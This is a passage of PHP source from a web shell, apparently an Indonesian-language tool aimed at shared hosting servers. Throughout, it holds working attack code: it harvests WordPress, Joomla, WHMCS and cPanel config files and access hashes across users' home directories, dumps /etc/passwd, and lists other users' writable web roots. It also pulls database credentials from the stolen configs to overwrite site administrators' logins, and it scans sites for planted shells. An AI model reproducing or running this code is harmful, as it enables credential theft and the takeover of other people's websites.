					"/home1/$user_cox/public_html/Main/configuration.php" => "JoomlaMain",
					"/home1/$user_cox/public_html/MAIN/configuration.php" => "JoomlaMain",
					"/home1/$user_cox/public_html/main/configuration.php" => "JoomlaMain",
					"/home1/$user_cox/public_html/Blog/configuration.php" => "JoomlaBlog",
					"/home1/$user_cox/public_html/BLOG/configuration.php" => "JoomlaBlog",
					"/home1/$user_cox/public_html/blog/configuration.php" => "JoomlaBlog",
					"/home1/$user_cox/public_html/Blogs/configuration.php" => "JoomlaBlogs",
					"/home1/$user_cox/public_html/BLOGS/configuration.php" => "JoomlaBlogs",
					"/home1/$user_cox/public_html/blogs/configuration.php" => "JoomlaBlogs",
					"/home1/$user_cox/public_html/beta/configuration.php" => "JoomlaBeta",
					"/home1/$user_cox/public_html/Beta/configuration.php" => "JoomlaBeta",
					"/home1/$user_cox/public_html/BETA/configuration.php" => "JoomlaBeta",
					"/home1/$user_cox/public_html/PRESS/configuration.php" => "JoomlaPress",
					"/home1/$user_cox/public_html/Press/configuration.php" => "JoomlaPress",
					"/home1/$user_cox/public_html/press/configuration.php" => "JoomlaPress",
					"/home1/$user_cox/public_html/Wp/configuration.php" => "JoomlaWp",
					"/home1/$user_cox/public_html/wp/configuration.php" => "JoomlaWp",
					"/home1/$user_cox/public_html/WP/configuration.php" => "JoomlaWP",
					"/home1/$user_cox/public_html/portal/configuration.php" => "JoomlaPortal",
					"/home1/$user_cox/public_html/PORTAL/configuration.php" => "JoomlaPortal",
					"/home1/$user_cox/public_html/Portal/configuration.php" => "JoomlaPortal",					
					"/home1/$user_cox/public_html/wp-config.php" => "WordPress",
					"/home1/$user_cox/public_html/wordpress/wp-config.php" => "WordPressWordpress",
					"/home1/$user_cox/public_html/Wordpress/wp-config.php" => "WordPressWordpress",
					"/home1/$user_cox/public_html/WORDPRESS/wp-config.php" => "WordPressWordpress",		
					"/home1/$user_cox/public_html/Home/wp-config.php" => "WordPressHome",
					"/home1/$user_cox/public_html/HOME/wp-config.php" => "WordPressHome",
					"/home1/$user_cox/public_html/home/wp-config.php" => "WordPressHome",
					"/home1/$user_cox/public_html/NEW/wp-config.php" => "WordPressNew",
					"/home1/$user_cox/public_html/New/wp-config.php" => "WordPressNew",
					"/home1/$user_cox/public_html/new/wp-config.php" => "WordPressNew",
					"/home1/$user_cox/public_html/News/wp-config.php" => "WordPressNews",
					"/home1/$user_cox/public_html/NEWS/wp-config.php" => "WordPressNews",
					"/home1/$user_cox/public_html/news/wp-config.php" => "WordPressNews",
					"/home1/$user_cox/public_html/Cms/wp-config.php" => "WordPressCms",
					"/home1/$user_cox/public_html/CMS/wp-config.php" => "WordPressCms",
					"/home1/$user_cox/public_html/cms/wp-config.php" => "WordPressCms",
					"/home1/$user_cox/public_html/Main/wp-config.php" => "WordPressMain",
					"/home1/$user_cox/public_html/MAIN/wp-config.php" => "WordPressMain",
					"/home1/$user_cox/public_html/main/wp-config.php" => "WordPressMain",
					"/home1/$user_cox/public_html/Blog/wp-config.php" => "WordPressBlog",
					"/home1/$user_cox/public_html/BLOG/wp-config.php" => "WordPressBlog",
					"/home1/$user_cox/public_html/blog/wp-config.php" => "WordPressBlog",
					"/home1/$user_cox/public_html/Blogs/wp-config.php" => "WordPressBlogs",
					"/home1/$user_cox/public_html/BLOGS/wp-config.php" => "WordPressBlogs",
					"/home1/$user_cox/public_html/blogs/wp-config.php" => "WordPressBlogs",
					"/home1/$user_cox/public_html/beta/wp-config.php" => "WordPressBeta",
					"/home1/$user_cox/public_html/Beta/wp-config.php" => "WordPressBeta",
					"/home1/$user_cox/public_html/BETA/wp-config.php" => "WordPressBeta",
					"/home1/$user_cox/public_html/PRESS/wp-config.php" => "WordPressPress",
					"/home1/$user_cox/public_html/Press/wp-config.php" => "WordPressPress",
					"/home1/$user_cox/public_html/press/wp-config.php" => "WordPressPress",
					"/home1/$user_cox/public_html/Wp/wp-config.php" => "WordPressWp",
					"/home1/$user_cox/public_html/wp/wp-config.php" => "WordPressWp",
					"/home1/$user_cox/public_html/WP/wp-config.php" => "WordPressWP",
					"/home1/$user_cox/public_html/portal/wp-config.php" => "WordPressPortal",
					"/home1/$user_cox/public_html/PORTAL/wp-config.php" => "WordPressPortal",
					"/home1/$user_cox/public_html/Portal/wp-config.php" => "WordPressPortal",
										"/home2/$user_cox/.my.cnf" => "cpanel",
					"/home2/$user_cox/.accesshash" => "WHM-accesshash",
					"/home2/$user_cox/public_html/bw-configs/config.ini" => "BosWeb",
					"/home2/$user_cox/public_html/config/koneksi.php" => "Lokomedia",
					"/home2/$user_cox/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
					"/home2/$user_cox/public_html/clientarea/configuration.php" => "WHMCS",				
					"/home2/$user_cox/public_html/whmcs/configuration.php" => "WHMCS",
					"/home2/$user_cox/public_html/forum/config.php" => "phpBB",
					"/home2/$user_cox/public_html/sites/default/settings.php" => "Drupal",
					"/home2/$user_cox/public_html/config/settings.inc.php" => "PrestaShop",
					"/home2/$user_cox/public_html/app/etc/local.xml" => "Magento",
					"/home2/$user_cox/public_html/admin/config.php" => "OpenCart",
					"/home2/$user_cox/public_html/slconfig.php" => "Sitelok",
					"/home2/$user_cox/public_html/application/config/database.php" => "Ellislab",					
					"/home2/$user_cox/public_html/whm/configuration.php" => "WHMCS",
					"/home2/$user_cox/public_html/whmc/WHM/configuration.ph" => "WHMC",
					"/home2/$user_cox/public_html/central/configuration.php" => "WHM Central",
					"/home2/$user_cox/public_html/whm/WHMCS/configuration.php" => "WHMCS",
					"/home2/$user_cox/public_html/whm/whmcs/configuration.php" => "WHMCS",
					"/home2/$user_cox/public_html/submitticket.php" => "WHMCS",										
					"/home2/$user_cox/public_html/configuration.php" => "Joomla",					
					"/home2/$user_cox/public_html/Joomla/configuration.php" => "JoomlaJoomla",
					"/home2/$user_cox/public_html/joomla/configuration.php" => "JoomlaJoomla",
					"/home2/$user_cox/public_html/JOOMLA/configuration.php" => "JoomlaJoomla",		
					"/home2/$user_cox/public_html/Home/configuration.php" => "JoomlaHome",
					"/home2/$user_cox/public_html/HOME/configuration.php" => "JoomlaHome",
					"/home2/$user_cox/public_html/home/configuration.php" => "JoomlaHome",
					"/home2/$user_cox/public_html/NEW/configuration.php" => "JoomlaNew",
					"/home2/$user_cox/public_html/New/configuration.php" => "JoomlaNew",
					"/home2/$user_cox/public_html/new/configuration.php" => "JoomlaNew",
					"/home2/$user_cox/public_html/News/configuration.php" => "JoomlaNews",
					"/home2/$user_cox/public_html/NEWS/configuration.php" => "JoomlaNews",
					"/home2/$user_cox/public_html/news/configuration.php" => "JoomlaNews",
					"/home2/$user_cox/public_html/Cms/configuration.php" => "JoomlaCms",
					"/home2/$user_cox/public_html/CMS/configuration.php" => "JoomlaCms",
					"/home2/$user_cox/public_html/cms/configuration.php" => "JoomlaCms",
					"/home2/$user_cox/public_html/Main/configuration.php" => "JoomlaMain",
					"/home2/$user_cox/public_html/MAIN/configuration.php" => "JoomlaMain",
					"/home2/$user_cox/public_html/main/configuration.php" => "JoomlaMain",
					"/home2/$user_cox/public_html/Blog/configuration.php" => "JoomlaBlog",
					"/home2/$user_cox/public_html/BLOG/configuration.php" => "JoomlaBlog",
					"/home2/$user_cox/public_html/blog/configuration.php" => "JoomlaBlog",
					"/home2/$user_cox/public_html/Blogs/configuration.php" => "JoomlaBlogs",
					"/home2/$user_cox/public_html/BLOGS/configuration.php" => "JoomlaBlogs",
					"/home2/$user_cox/public_html/blogs/configuration.php" => "JoomlaBlogs",
					"/home2/$user_cox/public_html/beta/configuration.php" => "JoomlaBeta",
					"/home2/$user_cox/public_html/Beta/configuration.php" => "JoomlaBeta",
					"/home2/$user_cox/public_html/BETA/configuration.php" => "JoomlaBeta",
					"/home2/$user_cox/public_html/PRESS/configuration.php" => "JoomlaPress",
					"/home2/$user_cox/public_html/Press/configuration.php" => "JoomlaPress",
					"/home2/$user_cox/public_html/press/configuration.php" => "JoomlaPress",
					"/home2/$user_cox/public_html/Wp/configuration.php" => "JoomlaWp",
					"/home2/$user_cox/public_html/wp/configuration.php" => "JoomlaWp",
					"/home2/$user_cox/public_html/WP/configuration.php" => "JoomlaWP",
					"/home2/$user_cox/public_html/portal/configuration.php" => "JoomlaPortal",
					"/home2/$user_cox/public_html/PORTAL/configuration.php" => "JoomlaPortal",
					"/home2/$user_cox/public_html/Portal/configuration.php" => "JoomlaPortal",					
					"/home2/$user_cox/public_html/wp-config.php" => "WordPress",
					"/home2/$user_cox/public_html/wordpress/wp-config.php" => "WordPressWordpress",
					"/home2/$user_cox/public_html/Wordpress/wp-config.php" => "WordPressWordpress",
					"/home2/$user_cox/public_html/WORDPRESS/wp-config.php" => "WordPressWordpress",		
					"/home2/$user_cox/public_html/Home/wp-config.php" => "WordPressHome",
					"/home2/$user_cox/public_html/HOME/wp-config.php" => "WordPressHome",
					"/home2/$user_cox/public_html/home/wp-config.php" => "WordPressHome",
					"/home2/$user_cox/public_html/NEW/wp-config.php" => "WordPressNew",
					"/home2/$user_cox/public_html/New/wp-config.php" => "WordPressNew",
					"/home2/$user_cox/public_html/new/wp-config.php" => "WordPressNew",
					"/home2/$user_cox/public_html/News/wp-config.php" => "WordPressNews",
					"/home2/$user_cox/public_html/NEWS/wp-config.php" => "WordPressNews",
					"/home2/$user_cox/public_html/news/wp-config.php" => "WordPressNews",
					"/home2/$user_cox/public_html/Cms/wp-config.php" => "WordPressCms",
					"/home2/$user_cox/public_html/CMS/wp-config.php" => "WordPressCms",
					"/home2/$user_cox/public_html/cms/wp-config.php" => "WordPressCms",
					"/home2/$user_cox/public_html/Main/wp-config.php" => "WordPressMain",
					"/home2/$user_cox/public_html/MAIN/wp-config.php" => "WordPressMain",
					"/home2/$user_cox/public_html/main/wp-config.php" => "WordPressMain",
					"/home2/$user_cox/public_html/Blog/wp-config.php" => "WordPressBlog",
					"/home2/$user_cox/public_html/BLOG/wp-config.php" => "WordPressBlog",
					"/home2/$user_cox/public_html/blog/wp-config.php" => "WordPressBlog",
					"/home2/$user_cox/public_html/Blogs/wp-config.php" => "WordPressBlogs",
					"/home2/$user_cox/public_html/BLOGS/wp-config.php" => "WordPressBlogs",
					"/home2/$user_cox/public_html/blogs/wp-config.php" => "WordPressBlogs",
					"/home2/$user_cox/public_html/beta/wp-config.php" => "WordPressBeta",
					"/home2/$user_cox/public_html/Beta/wp-config.php" => "WordPressBeta",
					"/home2/$user_cox/public_html/BETA/wp-config.php" => "WordPressBeta",
					"/home2/$user_cox/public_html/PRESS/wp-config.php" => "WordPressPress",
					"/home2/$user_cox/public_html/Press/wp-config.php" => "WordPressPress",
					"/home2/$user_cox/public_html/press/wp-config.php" => "WordPressPress",
					"/home2/$user_cox/public_html/Wp/wp-config.php" => "WordPressWp",
					"/home2/$user_cox/public_html/wp/wp-config.php" => "WordPressWp",
					"/home2/$user_cox/public_html/WP/wp-config.php" => "WordPressWP",
					"/home2/$user_cox/public_html/portal/wp-config.php" => "WordPressPortal",
					"/home2/$user_cox/public_html/PORTAL/wp-config.php" => "WordPressPortal",
					"/home2/$user_cox/public_html/Portal/wp-config.php" => "WordPressPortal",
					"/home3/$user_cox/.my.cnf" => "cpanel",
					"/home3/$user_cox/.accesshash" => "WHM-accesshash",
					"/home3/$user_cox/public_html/bw-configs/config.ini" => "BosWeb",
					"/home3/$user_cox/public_html/config/koneksi.php" => "Lokomedia",
					"/home3/$user_cox/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
					"/home3/$user_cox/public_html/clientarea/configuration.php" => "WHMCS",				
					"/home3/$user_cox/public_html/whmcs/configuration.php" => "WHMCS",
					"/home3/$user_cox/public_html/forum/config.php" => "phpBB",
					"/home3/$user_cox/public_html/sites/default/settings.php" => "Drupal",
					"/home3/$user_cox/public_html/config/settings.inc.php" => "PrestaShop",
					"/home3/$user_cox/public_html/app/etc/local.xml" => "Magento",
					"/home3/$user_cox/public_html/admin/config.php" => "OpenCart",
					"/home3/$user_cox/public_html/slconfig.php" => "Sitelok",
					"/home3/$user_cox/public_html/application/config/database.php" => "Ellislab",					
					"/home3/$user_cox/public_html/whm/configuration.php" => "WHMCS",
					"/home3/$user_cox/public_html/whmc/WHM/configuration.ph" => "WHMC",
					"/home3/$user_cox/public_html/central/configuration.php" => "WHM Central",
					"/home3/$user_cox/public_html/whm/WHMCS/configuration.php" => "WHMCS",
					"/home3/$user_cox/public_html/whm/whmcs/configuration.php" => "WHMCS",
					"/home3/$user_cox/public_html/submitticket.php" => "WHMCS",										
					"/home3/$user_cox/public_html/configuration.php" => "Joomla",					
					"/home3/$user_cox/public_html/Joomla/configuration.php" => "JoomlaJoomla",
					"/home3/$user_cox/public_html/joomla/configuration.php" => "JoomlaJoomla",
					"/home3/$user_cox/public_html/JOOMLA/configuration.php" => "JoomlaJoomla",		
					"/home3/$user_cox/public_html/Home/configuration.php" => "JoomlaHome",
					"/home3/$user_cox/public_html/HOME/configuration.php" => "JoomlaHome",
					"/home3/$user_cox/public_html/home/configuration.php" => "JoomlaHome",
					"/home3/$user_cox/public_html/NEW/configuration.php" => "JoomlaNew",
					"/home3/$user_cox/public_html/New/configuration.php" => "JoomlaNew",
					"/home3/$user_cox/public_html/new/configuration.php" => "JoomlaNew",
					"/home3/$user_cox/public_html/News/configuration.php" => "JoomlaNews",
					"/home3/$user_cox/public_html/NEWS/configuration.php" => "JoomlaNews",
					"/home3/$user_cox/public_html/news/configuration.php" => "JoomlaNews",
					"/home3/$user_cox/public_html/Cms/configuration.php" => "JoomlaCms",
					"/home3/$user_cox/public_html/CMS/configuration.php" => "JoomlaCms",
					"/home3/$user_cox/public_html/cms/configuration.php" => "JoomlaCms",
					"/home3/$user_cox/public_html/Main/configuration.php" => "JoomlaMain",
					"/home3/$user_cox/public_html/MAIN/configuration.php" => "JoomlaMain",
					"/home3/$user_cox/public_html/main/configuration.php" => "JoomlaMain",
					"/home3/$user_cox/public_html/Blog/configuration.php" => "JoomlaBlog",
					"/home3/$user_cox/public_html/BLOG/configuration.php" => "JoomlaBlog",
					"/home3/$user_cox/public_html/blog/configuration.php" => "JoomlaBlog",
					"/home3/$user_cox/public_html/Blogs/configuration.php" => "JoomlaBlogs",
					"/home3/$user_cox/public_html/BLOGS/configuration.php" => "JoomlaBlogs",
					"/home3/$user_cox/public_html/blogs/configuration.php" => "JoomlaBlogs",
					"/home3/$user_cox/public_html/beta/configuration.php" => "JoomlaBeta",
					"/home3/$user_cox/public_html/Beta/configuration.php" => "JoomlaBeta",
					"/home3/$user_cox/public_html/BETA/configuration.php" => "JoomlaBeta",
					"/home3/$user_cox/public_html/PRESS/configuration.php" => "JoomlaPress",
					"/home3/$user_cox/public_html/Press/configuration.php" => "JoomlaPress",
					"/home3/$user_cox/public_html/press/configuration.php" => "JoomlaPress",
					"/home3/$user_cox/public_html/Wp/configuration.php" => "JoomlaWp",
					"/home3/$user_cox/public_html/wp/configuration.php" => "JoomlaWp",
					"/home3/$user_cox/public_html/WP/configuration.php" => "JoomlaWP",
					"/home3/$user_cox/public_html/portal/configuration.php" => "JoomlaPortal",
					"/home3/$user_cox/public_html/PORTAL/configuration.php" => "JoomlaPortal",
					"/home3/$user_cox/public_html/Portal/configuration.php" => "JoomlaPortal",					
					"/home3/$user_cox/public_html/wp-config.php" => "WordPress",
					"/home3/$user_cox/public_html/wordpress/wp-config.php" => "WordPressWordpress",
					"/home3/$user_cox/public_html/Wordpress/wp-config.php" => "WordPressWordpress",
					"/home3/$user_cox/public_html/WORDPRESS/wp-config.php" => "WordPressWordpress",		
					"/home3/$user_cox/public_html/Home/wp-config.php" => "WordPressHome",
					"/home3/$user_cox/public_html/HOME/wp-config.php" => "WordPressHome",
					"/home3/$user_cox/public_html/home/wp-config.php" => "WordPressHome",
					"/home3/$user_cox/public_html/NEW/wp-config.php" => "WordPressNew",
					"/home3/$user_cox/public_html/New/wp-config.php" => "WordPressNew",
					"/home3/$user_cox/public_html/new/wp-config.php" => "WordPressNew",
					"/home3/$user_cox/public_html/News/wp-config.php" => "WordPressNews",
					"/home3/$user_cox/public_html/NEWS/wp-config.php" => "WordPressNews",
					"/home3/$user_cox/public_html/news/wp-config.php" => "WordPressNews",
					"/home3/$user_cox/public_html/Cms/wp-config.php" => "WordPressCms",
					"/home3/$user_cox/public_html/CMS/wp-config.php" => "WordPressCms",
					"/home3/$user_cox/public_html/cms/wp-config.php" => "WordPressCms",
					"/home3/$user_cox/public_html/Main/wp-config.php" => "WordPressMain",
					"/home3/$user_cox/public_html/MAIN/wp-config.php" => "WordPressMain",
					"/home3/$user_cox/public_html/main/wp-config.php" => "WordPressMain",
					"/home3/$user_cox/public_html/Blog/wp-config.php" => "WordPressBlog",
					"/home3/$user_cox/public_html/BLOG/wp-config.php" => "WordPressBlog",
					"/home3/$user_cox/public_html/blog/wp-config.php" => "WordPressBlog",
					"/home3/$user_cox/public_html/Blogs/wp-config.php" => "WordPressBlogs",
					"/home3/$user_cox/public_html/BLOGS/wp-config.php" => "WordPressBlogs",
					"/home3/$user_cox/public_html/blogs/wp-config.php" => "WordPressBlogs",
					"/home3/$user_cox/public_html/beta/wp-config.php" => "WordPressBeta",
					"/home3/$user_cox/public_html/Beta/wp-config.php" => "WordPressBeta",
					"/home3/$user_cox/public_html/BETA/wp-config.php" => "WordPressBeta",
					"/home3/$user_cox/public_html/PRESS/wp-config.php" => "WordPressPress",
					"/home3/$user_cox/public_html/Press/wp-config.php" => "WordPressPress",
					"/home3/$user_cox/public_html/press/wp-config.php" => "WordPressPress",
					"/home3/$user_cox/public_html/Wp/wp-config.php" => "WordPressWp",
					"/home3/$user_cox/public_html/wp/wp-config.php" => "WordPressWp",
					"/home3/$user_cox/public_html/WP/wp-config.php" => "WordPressWP",
					"/home3/$user_cox/public_html/portal/wp-config.php" => "WordPressPortal",
					"/home3/$user_cox/public_html/PORTAL/wp-config.php" => "WordPressPortal",
					"/home3/$user_cox/public_html/Portal/wp-config.php" => "WordPressPortal"					
						);	
					foreach($grab_config as $config => $nama_config) {
						$ambil_config = file_get_contents($config);
						if($ambil_config == '') {
						} else {
							$file_config = fopen("cox_config/$user_cox-$nama_config.txt","w");
							fputs($file_config,$ambil_config);
						}
					}
				}		
			}
			echo "<center><a href='?dir=$dir/cox_config'><font color=lime>Done</font></a></center>";
			}else{
				
		echo "<form method=\"post\" action=\"\"><center>etc/passw ( Error ? <a href='?dir=$dir&do=passwbypass'>Bypass Here</a> )<br><textarea name=\"passwd\" class='area' rows='15' cols='60'>\n";
		echo file_get_contents('/etc/passwd'); 
		echo "</textarea><br><input type=\"submit\" value=\"GassPoll\"></td></tr></center>\n";
        }
} elseif($_GET['do'] == 'jumping') {
	$i = 0;
	echo "<pre><div class='margin: 5px auto;'>";
	$etc = fopen("/etc/passwd", "r");
	while($passwd = fgets($etc)) {
		if($passwd == '' || !$etc) {
			echo "<font color=red>Can't read /etc/passwd</font>";
		} else {
			preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
			foreach($user_jumping[1] as $user_idx_jump) {
				$user_jumping_dir = "/home/$user_idx_jump/public_html";
				if(is_readable($user_jumping_dir)) {
					$i++;
					$jrw = "[<font color=lime>R</font>] <a href='?dir=$user_jumping_dir'><font color=green>$user_jumping_dir</font></a><br>";
					if(is_writable($user_jumping_dir)) {
						$jrw = "[<font color=lime>RW</font>] <a href='?dir=$user_jumping_dir'><font color=green>$user_jumping_dir</font></a><br>";
					}
					echo $jrw;
					$domain_jump = file_get_contents("/etc/named.conf");	
					if($domain_jump == '') {
						echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
					} else {
						preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
						foreach($domains_jump[1] as $dj) {
							$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
							$user_jumping_url = $user_jumping_url['name'];
							if($user_jumping_url == $user_idx_jump) {
								echo " => ( <u>$dj</u> )<br>";
								break;
							}
						}
					}
				}
			}
		}
	}
	if($i == 0) { 
	} else {
		echo "<br>Total ada ".$i." Kimcil di ".gethostbyname($_SERVER['HTTP_HOST'])."";
	}
	echo "</div></pre>";
} elseif($_GET['do'] == 'auto_edit_user') {
	if($_POST['hajar']) {
		if(strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6) {
			echo "username atau password harus lebih dari 6 karakter";
		} else {
			$user_baru = $_POST['user_baru'];
			$pass_baru = md5($_POST['pass_baru']);
			$conf = $_POST['config_dir'];
			$scan_conf = scandir($conf);
			foreach($scan_conf as $file_conf) {
				if(!is_file("$conf/$file_conf")) continue;
				$config = file_get_contents("$conf/$file_conf");
				if(preg_match("/JConfig|joomla/",$config)) {
					$dbhost = ambilkata($config,"host = '","'");
					$dbuser = ambilkata($config,"user = '","'");
					$dbpass = ambilkata($config,"password = '","'");
					$dbname = ambilkata($config,"db = '","'");
					$dbprefix = ambilkata($config,"dbprefix = '","'");
					$prefix = $dbprefix."users";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
					$result = mysql_fetch_array($q);
					$id = $result['id'];
					$site = ambilkata($config,"sitename = '","'");
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Joomla<br>";
					if($site == '') {
						echo "Sitename => <font color=red>error, gabisa ambil nama domain nya</font><br>";
					} else {
						echo "Sitename => $site<br>";
					}
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>success esuccesser, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/WordPress/",$config)) {
					$dbhost = ambilkata($config,"DB_HOST', '","'");
					$dbuser = ambilkata($config,"DB_USER', '","'");
					$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
					$dbname = ambilkata($config,"DB_NAME', '","'");
					$dbprefix = ambilkata($config,"table_prefix  = '","'");
					$prefix = $dbprefix."users";
					$option = $dbprefix."options";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[ID];
					$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
					$result2 = mysql_fetch_array($q2);
					$target = $result2[option_value];
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru' WHERE id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Wordpress<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>success successser, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/Magento|Mage_Core/",$config)) {
					$dbhost = ambilkata($config,"<host><![CDATA[","]]></host>");
					$dbuser = ambilkata($config,"<username><![CDATA[","]]></username>");
					$dbpass = ambilkata($config,"<password><![CDATA[","]]></password>");
					$dbname = ambilkata($config,"<dbname><![CDATA[","]]></dbname>");
					$dbprefix = ambilkata($config,"<table_prefix><![CDATA[","]]></table_prefix>");
					$prefix = $dbprefix."admin_user";
					$option = $dbprefix."core_config_data";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[user_id];
					$q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
					$result2 = mysql_fetch_array($q2);
					$target = $result2[value];
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Magento<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>successsuccessuser, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)) {
					$dbhost = ambilkata($config,"'DB_HOSTNAME', '","'");
					$dbuser = ambilkata($config,"'DB_USERNAME', '","'");
					$dbpass = ambilkata($config,"'DB_PASSWORD', '","'");
					$dbname = ambilkata($config,"'DB_DATABASE', '","'");
					$dbprefix = ambilkata($config,"'DB_PREFIX', '","'");
					$prefix = $dbprefix."user";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[user_id];
					$target = ambilkata($config,"HTTP_SERVER', '","'");
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => OpenCart<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>successuccess user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)) {
					$dbhost = ambilkata($config,'server = "','"');
					$dbuser = ambilkata($config,'username = "','"');
					$dbpass = ambilkata($config,'password = "','"');
					$dbname = ambilkata($config,'database = "','"');
					$prefix = "users";
					$option = "identitas";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
					$result = mysql_fetch_array($q);
					$target = $result[alamat_website];
					if($target == '') {
						$target2 = $result[url];
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
						if($target2 == '') {
							$url_target2 = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
						} else {
							$cek_login3 = file_get_contents("$target2/adminweb/");
							$cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
							if(preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
								$url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
							} elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
								$url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
							} else {
								$url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
							}
						}
					} else {
						$cek_login = file_get_contents("$target/adminweb/");
						$cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
						if(preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
							$url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
						} elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
							$url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
						} else {
							$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
						}
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Lokomedia<br>";
					if(preg_match('/error, gabisa ambil nama domain nya/', $url_target)) {
						echo $url_target2;
					} else {
						echo $url_target;
					}
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>succesuccesst user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				}
			}
		}
	} else {
		echo "<center>
		<h1>Auto Edit User Config</h1>
		<form method='post'>
		DIR Config: <br>
		<input type='text' size='50' name='config_dir' value='$dir'><br><br>
		Set User & Pass: <br>
		<input type='text' name='user_baru' value='cor0.id' placeholder='user_baru'><br>
		<input type='text' name='pass_baru' value='cor0.id' placeholder='pass_baru'><br>
		<input type='submit' name='hajar' value='Cr00tzz!' style='width: 215px;'>
		</form>
		<span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
		";
	}
}elseif($_GET['do'] == 'shelscan') {
	echo'<center><h2>Shell Finder</h2>
<form action="" method="post">
<input type="text" size="50" name="traget" value="http://www.site.com/"/>
<br>
<input name="scan" value="Start Scaning"  style="width: 215px;" type="submit">
</form><br>';
if (isset($_POST["scan"])) {  
$url = $_POST['traget'];
echo "<br /><span class='start'>Scanning ".$url."<br /><br /></span>";
echo "Result :<br />";
$shells = array("WSO.php","dz.php","cpanel.php","cpn.php","sql.php","mysql.php","madspot.php","cp.php","cpbt.php","sYm.php",
"x.php","r99.php","lol.php","jo.php","wp.php","whmcs.php","shellz.php","d0main.php","d0mains.php","users.php",
